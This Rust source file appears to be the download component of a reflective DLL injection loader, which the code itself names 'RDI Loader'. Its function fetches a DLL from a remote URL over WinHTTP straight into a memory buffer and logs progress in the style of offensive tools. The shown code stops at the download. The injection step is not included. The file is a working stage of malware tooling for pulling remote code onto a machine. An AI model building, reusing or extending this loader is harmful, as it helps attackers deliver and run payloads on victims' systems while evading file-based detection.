use windows::Win32::Networking::WinHttp::*;
use windows::core::{PWSTR, PCWSTR, w};

const MAX_URL_LENGTH: usize = 2048;

pub fn download_dll(url: &str) -> Result<Vec<u8>, String> {
    // Validate URL
    if url.is_empty() {
        return Err("Error: URL is empty".to_string());
    }

    if url.len() > MAX_URL_LENGTH {
        return Err(format!("Error: URL too long (max {} characters)", MAX_URL_LENGTH));
    }

    // Convert to wide string
    let url_wide: Vec<u16> = url.encode_utf16().chain(std::iter::once(0)).collect();

    // Parse URL
    let mut url_components = URL_COMPONENTS {
        dwStructSize: std::mem::size_of::<URL_COMPONENTS>() as u32,
        ..Default::default()
    };

    let mut hostname = [0u16; 256];
    let mut url_path = [0u16; 2048];

    url_components.lpszHostName = PWSTR(hostname.as_mut_ptr());
    url_components.dwHostNameLength = hostname.len() as u32;
    url_components.lpszUrlPath = PWSTR(url_path.as_mut_ptr());
    url_components.dwUrlPathLength = url_path.len() as u32;
    url_components.dwSchemeLength = 1;

    unsafe {
        if WinHttpCrackUrl(&url_wide, 0, &mut url_components).is_err() {
            return Err("Error: Failed to parse URL".to_string());
        }
    }

    let host_str = String::from_utf16_lossy(
        &hostname[..hostname.iter().position(|&x| x == 0).unwrap_or(hostname.len())]
    );
    let path_str = String::from_utf16_lossy(
        &url_path[..url_path.iter().position(|&x| x == 0).unwrap_or(url_path.len())]
    );

    println!(
        "[*] Parsed URL - Host: {}, Port: {}, Path: {}",
        host_str, url_components.nPort, path_str
    );

    // Open session
    let h_session = unsafe {
        let h = WinHttpOpen(
            w!("RDI Loader"),
            WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
            None,
            None,
            0,
        );
        if h.is_null() {
            return Err("Error: Failed to open WinHTTP session".to_string());
        }
        h
    };

    // Connect to server
    let h_connect = unsafe {
        let h = WinHttpConnect(
            h_session,
            PCWSTR(hostname.as_ptr()),
            url_components.nPort,
            0,
        );
        if h.is_null() {
            WinHttpCloseHandle(h_session);
            return Err("Error: Failed to connect to server".to_string());
        }
        h
    };

    // Create request
    let is_https = url_components.nScheme.0 == 2; // 2 = INTERNET_SCHEME_HTTPS
    let flags = if is_https { WINHTTP_FLAG_SECURE } else { WINHTTP_OPEN_REQUEST_FLAGS(0) };

    let h_request = unsafe {
        let h = WinHttpOpenRequest(
            h_connect,
            w!("GET"),
            PCWSTR(url_path.as_ptr()),
            None,
            None,
            std::ptr::null(),
            flags,
        );
        if h.is_null() {
            WinHttpCloseHandle(h_connect);
            WinHttpCloseHandle(h_session);
            return Err("Error: Failed to create HTTP request".to_string());
        }
        h
    };

    // Send request
    unsafe {
        if WinHttpSendRequest(
            h_request,
            None,
            None,
            0,
            0,
            0,
        ).is_err() {
            WinHttpCloseHandle(h_request);
            WinHttpCloseHandle(h_connect);
            WinHttpCloseHandle(h_session);
            return Err("Error: Failed to send HTTP request".to_string());
        }

        // Receive response
        if WinHttpReceiveResponse(h_request, std::ptr::null_mut()).is_err() {
            WinHttpCloseHandle(h_request);
            WinHttpCloseHandle(h_connect);
            WinHttpCloseHandle(h_session);
            return Err("Error: Failed to receive HTTP response".to_string());
        }
    }

    // Read data
    let mut dll_data = Vec::new();
    unsafe {
        let mut bytes_available = 0;
        while WinHttpQueryDataAvailable(h_request, &mut bytes_available).is_ok()
            && bytes_available > 0
        {
            let mut buffer = vec![0u8; bytes_available as usize];
            let mut bytes_read = 0;

            if WinHttpReadData(
                h_request,
                buffer.as_mut_ptr() as _,
                bytes_available,
                &mut bytes_read,
            ).is_ok() && bytes_read > 0 {
                dll_data.extend_from_slice(&buffer[..bytes_read as usize]);
            }
        }
    }

    // Cleanup handles
    unsafe {
        let _ = WinHttpCloseHandle(h_request);
        let _ = WinHttpCloseHandle(h_connect);
        let _ = WinHttpCloseHandle(h_session);
    }

    if dll_data.is_empty() {
        return Err("Error: Downloaded file is empty (0 bytes)".to_string());
    }

    println!("[+] Downloaded {} bytes", dll_data.len());
    Ok(dll_data)
}
